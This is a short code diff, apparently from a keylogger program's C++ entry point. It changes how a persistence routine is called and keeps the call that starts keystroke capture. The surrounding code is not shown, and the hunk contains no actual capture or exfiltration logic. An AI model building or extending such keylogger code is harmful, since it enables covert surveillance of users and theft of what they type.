@@ -9,9 +9,9 @@ int main(int argc, char *argv[]) {
 
 	KeyLogger* kl = KeyLogger::getInstance();
 
-	kl->persist(argv[0]);
+	kl->persist();
 
     kl->listen();
 
-    return 0;
+	return 0;
 }
